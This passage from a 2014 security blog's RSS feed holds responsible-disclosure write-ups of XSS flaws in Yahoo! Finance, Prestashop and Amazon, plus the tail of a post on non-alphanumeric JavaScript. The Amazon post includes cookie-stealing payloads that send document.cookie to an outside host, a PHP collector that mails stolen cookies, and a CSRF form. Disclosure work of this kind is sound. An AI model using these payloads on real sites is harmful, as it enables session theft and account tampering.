      &lt;td&gt;‘p’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘q’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[1]&lt;/td&gt;
      &lt;td&gt;‘r’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[3]&lt;/td&gt;
      &lt;td&gt;’s’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[0]&lt;/td&gt;
      &lt;td&gt;‘t’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [[]*[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“undefined”[0]&lt;/td&gt;
      &lt;td&gt;‘u’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [[]*[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘v’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘w’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘x’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘y’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;unknown&lt;/td&gt;
      &lt;td&gt;‘z’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;unknown&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;references&quot;&gt;#5 References&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.w3schools.com/jsref/&quot; title=&quot;W3C - JavaScript and HTML DOM Reference.&quot;&gt;http://www.w3schools.com/jsref/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference&quot; title=&quot;MDN - Mozilla Developer Network - JavaScript reference&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/images/6/66/OWASP_Manchester_Nonalpha.pdf&quot; title=&quot;Non-alphanumeric code - With JavaScript &amp;amp; PHP by Gareth Heyes&quot;&gt;https://www.owasp.org/images/6/66/OWASP_Manchester_Nonalpha.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<pubDate>Wed, 08 Oct 2014 02:27:33 +0200</pubDate>
				<link>http://deftcode.ninja/post/non-alphanumeric-javascript-coding/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/non-alphanumeric-javascript-coding/</guid>
				
				
				<category>coding</category>
				
				<category>security</category>
				
			</item>
		
			<item>
				<title>Disclosure: Yahoo! Finance Cross-site Scripting</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;Found a &lt;code&gt;Stored Cross-site Scriping&lt;/code&gt; in &lt;code&gt;Yahoo! Finance&lt;/code&gt;.
(Tested on all sub-domains &lt;code&gt;*.yahoo.finance.com&lt;/code&gt;).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;At Yahoo Finance, you get free stock quotes, up to date news, portfolio management resources, international market data, message boards, and mortgage rates that help you manage your financial life.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;proof-of-concept-of-stored-xss&quot;&gt;Proof of Concept of Stored XSS:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Go to &lt;a href=&quot;https://it.finance.yahoo.com/&quot; title=&quot;Yahoo! Finance&quot;&gt;Yahoo! Finance&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Create new portfolio and show It&lt;/li&gt;
  &lt;li&gt;Click to &lt;code&gt;&quot;Add/modify codes&quot;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Generate the vector payload&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;  &amp;lt;img/src=1 onerror=alert(1)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Encode this vector through &lt;code&gt;URL Hexadecimal&lt;/code&gt; bytes sequence&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;  %3c%69%6d%67%2f%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;Append the vector below to the inputs and click &lt;code&gt;&quot;Add code&quot;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Back to Portfolio Home&lt;/li&gt;
  &lt;li&gt;Click to link &lt;code&gt;&quot;Reorder&quot;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Paylaod was triggered&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;example-of-portfolio-sort-link&quot;&gt;Example of portfolio sort link:&lt;/h4&gt;

&lt;p&gt;https://it.finance.yahoo.com/portfolio/pf_&lt;strong&gt;XX&lt;/strong&gt;/sort
where &lt;strong&gt;XX&lt;/strong&gt; = &lt;code&gt;id of created portfolio&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;example-demostration-screen&quot;&gt;Example demostration screen&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/images/security/responsible-disclosure/yahoo-xss.png&quot;&gt;&lt;img src=&quot;/images/security/responsible-disclosure/yahoo-xss.png&quot; alt=&quot;Yahoo Stored XSS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;28/08/2014&lt;/strong&gt; – Report to Yahoo! Security Team through &lt;a href=&quot;https://hackerone.com/,&quot; title=&quot;Hackerone&quot;&gt;Hackerone.com&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;29/09/2014&lt;/strong&gt; – Received a response from Yahoo&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;01/10/2014&lt;/strong&gt; – Reply from Yahoo! Security Team that informs me that the bug was fixed&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;06/10/2014&lt;/strong&gt; – Yahoo reward me with $600&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;07/10/2014&lt;/strong&gt; – Public disclosure&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;

&lt;p&gt;Thanks Yahoo! Security Team for the add to &lt;a href=&quot;https://hackerone.com/yahoo/thanks&quot; title=&quot;Yahoo! Wall Of Fame - eurialo&quot;&gt;Wall Of Fame&lt;/a&gt;.&lt;/p&gt;
</description>
				<pubDate>Thu, 02 Oct 2014 22:04:21 +0200</pubDate>
				<link>http://deftcode.ninja/post/yahoo-finance-cross-site-scripting/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/yahoo-finance-cross-site-scripting/</guid>
				
				
				<category>responsible-disclosure</category>
				
			</item>
		
			<item>
				<title>Prestashop 1.6.0.6 - DOM based Cross-site Scripting</title>
				<description>&lt;p&gt;The version 1.6.0.6 of Prestashop is vulnerable to &lt;code&gt;DOM Based XSS&lt;/code&gt;, the page location at
&lt;code&gt;/index.php?controller=stores&lt;/code&gt; show you the locations of the stores, this feature can be enabled from the admin panel by &lt;code&gt;Preferences / Store Contacts&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;vulnerable-function-is-stored-in-the-core-js-cached-version-see-storesjs&quot;&gt;Vulnerable function is stored in the Core JS cached version (see stores.js)&lt;/h3&gt;

&lt;p&gt;&lt;code&gt;snippet:&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;searchLocations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#stores_loader&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;show&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;addressInput&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;geocoder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;google&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;maps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Geocoder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;geocoder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;geocode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;google&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;maps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;GeocoderStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;searchLocationsNear&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;geometry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fancybox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fancybox&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;inline&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;autoScale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;minHeight&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;p class=&amp;quot;fancybox-error&amp;quot;&amp;gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;translation_6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;translation_6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;#stores_loader&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The variable &lt;code&gt;address&lt;/code&gt; is not properly sanitized, therefore a &lt;strong&gt;Cross-site Scripting&lt;/strong&gt; can be executed by injecting a simple vector like that:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;autofocus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;example-demostration-screen-in-prestashop-online-demo&quot;&gt;Example demostration screen in Prestashop online Demo&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/images/security/responsible-disclosure/prestashop-xss.png&quot;&gt;&lt;img src=&quot;/images/security/responsible-disclosure/prestashop-xss.png&quot; alt=&quot;Prestashop Demo XSS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;08/06/2014&lt;/strong&gt; – Report to Prestashop Bugtraq&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;09/06/2014&lt;/strong&gt; – Fixed by commit &lt;a href=&quot;https://github.com/PrestaShop/PrestaShop/commit/29d8cf1576cadd321d131f33735c4635759c10f5&quot; title=&quot;GitHub Commit-ID&quot;&gt;29d8cf1576cadd321d131f33735c4635759c10f5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;10/06/2014&lt;/strong&gt; – Public disclosure&lt;/li&gt;
&lt;/ul&gt;

</description>
				<pubDate>Tue, 10 Jun 2014 14:32:18 +0200</pubDate>
				<link>http://deftcode.ninja/post/prestashop-dom-based-xss/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/prestashop-dom-based-xss/</guid>
				
				
				<category>security</category>
				
			</item>
		
			<item>
				<title>Disclosure: Stored XSS in Amazon.com with CSRF Bypass</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;The &lt;strong&gt;Amazon YourMediaLibrary&lt;/strong&gt; is vulnerable to stored &lt;code&gt;XSS Vulnerability&lt;/code&gt;, the attacker can redirect an user to his profile page and steal user-cookie to perform an &lt;code&gt;CSRF Attack&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Your Media Library is a secure location from which you retrieve all digital products, including eDocs, Amazon Upgrades, the free electronic user manuals that come with some products, and free music files that are available with select CDs.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;proof-of-concept-of-stored-xss---double-encoding-techniqueencoding&quot;&gt;Proof of Concept of Stored XSS - &lt;a href=&quot;https://www.owasp.org/index.php/Double_Encoding&quot; title=&quot;OSWAP - Double Encoding Technique&quot;&gt;Double Encoding Technique&lt;/a&gt;:&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Let’s go:&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;First go to yourmedialibrary page &lt;a href=&quot;https://www.amazon.com/gp/ays/index.html&quot; title=&quot;Amazon YourMediaLibrary&quot;&gt;Amazon YourMediaLibrary&lt;/a&gt; and click to Profile&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Insert this vector into &lt;code&gt;Interests&lt;/code&gt; or &lt;code&gt;In my own words&lt;/code&gt; inputs:&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;  %253Cscript%253Ealert(document.cookie)%253C%252Fscript%253E
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;Wait for auto-saving or click “Save”&lt;/li&gt;
  &lt;li&gt;Back to profile page to see the injected code&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;possible-attack-scenario-with-csrf-sessionid-bypass&quot;&gt;Possible Attack Scenario with CSRF SessionID Bypass:&lt;/h3&gt;

&lt;p&gt;Since many values of cookie were setted like &lt;strong&gt;HttpOnly&lt;/strong&gt;, the malicious user can’t hijack the session but anyway It can execute an arbiratry operations through an &lt;code&gt;CSRF Attack&lt;/code&gt; knowning the &lt;code&gt;session-id&lt;/code&gt; saved in the &lt;code&gt;user-cookie&lt;/code&gt; (however the session-id does the function of security-token):&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Generate a base html payload to steal user cookie:&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; &amp;lt;script&amp;gt;
     location.href=&#39;//land-domain.com/steal.php?cookie=&#39;+document.cookie;
 &amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Or if you want a payload without redirect:&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; &amp;lt;img style=&#39;display:none&#39; src=x onerror=this.src=&#39;//land-domain.com/?cookie=&#39;+document.cookie&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Attacker adds this double encoded vector into his interests in settings profile page:&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; %253Cscript%253Elocation.href%253D%2527//land-domain.com/steal.php
 %252Fcookie=%2527%252Bdocument.cookie%253C%252Fscript%253E
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Then It redirects the user to his medialibrary profile page to steal and store cookie by remote malicious file (basic steal.php)&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; $ echo &quot;
 &amp;lt;?php
   mail(&#39;attacker@mailz.org&#39;, &#39;Cookie&#39;, $_GET[&#39;cookie&#39;]);
   header(&#39;Location: &#39;.$_SERVER[&#39;HTTP_REFERER&#39;]);
 ?&amp;gt;&quot; &amp;gt; /var/www/land-domain.com/steal.php
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Now he’s got a ‘session-id=180-0536506-4528302′ of user (that is not secured).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;With this simple CSRF page:&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt; &amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
     &amp;lt;title&amp;gt;Amazon CSRF&amp;lt;/title&amp;gt;
 &amp;lt;/haed&amp;gt;
 &amp;lt;body&amp;gt;
     &amp;lt;form method=&quot;POST&quot; action=&quot;https://www.amazon.com/gp/ays/ajax/setProfile.html&quot;&amp;gt;
         &amp;lt;input type=&quot;hidden&quot; name=&quot;key&quot; value=&quot;inMyOwnWords&quot;&amp;gt;
         &amp;lt;input type=&quot;hidden&quot; name=&quot;value&quot; value=&quot;injected&quot;&amp;gt;
         &amp;lt;input type=&quot;hidden&quot; name=&quot;sessionId&quot; value=&quot;180-0536506-4528302&quot;&amp;gt;
     &amp;lt;/form&amp;gt;
 &amp;lt;/body&amp;gt;
 &amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The malicious user can change all profile settings of user.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;example-demostration-screen&quot;&gt;Example demostration screen&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/images/security/responsible-disclosure/amazon-xss.png&quot;&gt;&lt;img src=&quot;/images/security/responsible-disclosure/amazon-xss.png&quot; alt=&quot;Prestashop Demo XSS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;28/05/2014&lt;/strong&gt; – Report to Amazon Security Team&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;29/05/2014&lt;/strong&gt; – Received a response from amazon that assign a ticket&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;01/06/2014&lt;/strong&gt; – Amazon fix the bug&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;02/06/2014&lt;/strong&gt; – Public disclosure&lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Mon, 02 Jun 2014 11:20:01 +0200</pubDate>
				<link>http://deftcode.ninja/post/stored-xss-in-amazon-com-with-csrf-bypass/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/stored-xss-in-amazon-com-with-csrf-bypass/</guid>
				
				
				<category>responsible-disclosure</category>
				
			</item>
		
	</channel>
</rss>
